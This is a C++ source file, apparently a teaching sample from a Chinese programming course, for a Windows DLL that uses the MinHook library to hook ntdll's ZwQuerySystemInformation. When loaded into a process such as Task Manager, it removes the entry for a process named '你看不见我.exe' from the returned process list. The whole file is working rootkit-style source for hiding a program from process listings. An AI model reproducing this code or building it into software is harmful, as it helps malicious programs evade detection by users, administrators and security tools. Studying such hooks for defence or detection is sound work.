// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <Windows.h>
#include "MinHook.h"
#include <winternl.h>
#include <cstdio>
#include <tlhelp32.h>
#include <string>
#if defined _M_X64
#pragma comment(lib, "libMinHook-x64-v141-md.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook-x86-v141-md.lib")
#endif

DWORD dwHidePid;
// Helper function for MH_CreateHookApi().
template <typename T>
inline MH_STATUS MH_CreateHookApiEx(LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)
{
	return MH_CreateHookApi(pszModule, pszProcName, pDetour, reinterpret_cast<LPVOID*>(ppOriginal));
}

typedef int (WINAPI* MESSAGEBOXW)(HWND, LPCWSTR, LPCWSTR, UINT);
typedef   NTSTATUS(WINAPI* typedef_ZwQuerySystemInformation)(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
	);


typedef_ZwQuerySystemInformation fpZwQuerySystemInformation = NULL;

DWORD  GetPidByName(LPCWSTR name)
{
	BOOL bRet;
	PROCESSENTRY32 pe;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe.dwSize = sizeof(pe);
	bRet = Process32First(hSnapshot, &pe);
	while (bRet)
	{
		if (lstrcmp(pe.szExeFile, name) == 0)
			return pe.th32ProcessID;
		bRet = Process32Next(hSnapshot, &pe);
	}
	return 0;
}


NTSTATUS WINAPI MyZwQuerySystemInformation(
	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_ PVOID SystemInformation,
	_In_ ULONG SystemInformationLength,
	_Out_opt_ PULONG ReturnLength
)
{
	//printf("MyZwQuerySystemInformation Run\n");
	
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;

	// 调用原函数 ZwQuerySystemInformation
	NTSTATUS status = fpZwQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);


	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		
		while (TRUE)
		{
			// 判断是否是要隐藏的进程PID，是则进行单链表删除操作
			if (dwHidePid == (DWORD)pCur->UniqueProcessId)
			{
				//删除（尾结点）隐藏进程信息
				if (0 == pCur->NextEntryOffset)
				{
					if (pPrev != NULL)
						pPrev->NextEntryOffset = 0;
				}
				else
				{
					// 删除（中间结点）隐藏进程信息
					if (pPrev != NULL)
						pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
				
				
			}
			else
			{
				pPrev = pCur;
			}

			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pCur + pCur->NextEntryOffset);
		}
	}
	return status;
}


BOOL Hook() 
{
	// 初始化 MinHook.
	if (MH_Initialize() != MH_OK)
	{
		return FALSE;
	}
	// 获取 ntdll.dll 句柄
	HMODULE hDll = ::GetModuleHandle(L"ntdll.dll");
	if (NULL == hDll)
	{
		MessageBox(NULL, L"ntdll 获取异常", L"唐老师编程温馨提示：", MB_OK);
		return FALSE;
	}
	// 获取 ZwQuerySystemInformation 函数地址
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		MessageBox(NULL, L"ZwQuerySystemInformation 获取异常", L"唐老师编程温馨提示：", MB_OK);
		return FALSE;
	}
	// 用MH_CreateHookApiEx 建立 ZwQuerySystemInformation 内联钩子 
	if (MH_CreateHookApiEx(L"ntdll", "ZwQuerySystemInformation", MyZwQuerySystemInformation, &fpZwQuerySystemInformation) != MH_OK)
	{
		MessageBox(NULL,L"ZwQuerySystemInformation Hook 创建异常",L"唐老师编程温馨提示：",MB_OK);
		return FALSE;
	}

	// 启动 hook for ZwQuerySystemInformation.
	if (MH_EnableHook(ZwQuerySystemInformation) != MH_OK)
	{
		MessageBox(NULL, L"ZwQuerySystemInformation Hook 启动异常", L"唐老师编程温馨提示：", MB_OK);
		return FALSE;
	}

	//MessageBox(NULL, L"ZwQuerySystemInformation Hook 成功", L"唐老师编程温馨提示：", MB_OK);
	
	return TRUE;
}

BOOL UnHook() 
{
	MH_DisableHook(MH_ALL_HOOKS);
	MH_Uninitialize();
	//MessageBox(NULL, L"任务管理器进程结束,卸载HOOK", L"唐老师编程温馨提示：", MB_OK);
	return TRUE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		dwHidePid = GetPidByName(L"你看不见我.exe");
		Hook();
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
		UnHook();
        break;
    }
    return TRUE;
}

